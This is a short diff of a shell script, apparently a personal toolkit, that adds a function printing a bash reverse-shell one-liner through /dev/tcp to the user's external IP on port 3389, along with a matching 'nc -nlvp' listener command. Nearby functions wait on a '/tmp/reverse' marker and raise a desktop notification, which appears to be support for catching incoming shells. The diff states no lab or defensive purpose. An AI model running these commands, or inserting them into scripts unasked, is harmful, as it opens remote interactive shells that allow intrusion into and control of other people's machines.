@@ -668,3 +668,10 @@ rshell_notify_server(){
 rshell_notify_local(){
     waitdiff 'aws_cmd ls /tmp/reverse'; zenity --info --text reverse
 }
+
+rshell_show(){
+port=3389
+echo "bash -i >& /dev/tcp/$(myip | grep external | cut -d: -f2)/$port 0>&1"
+echo "nc -nlvp $port"
+}
+
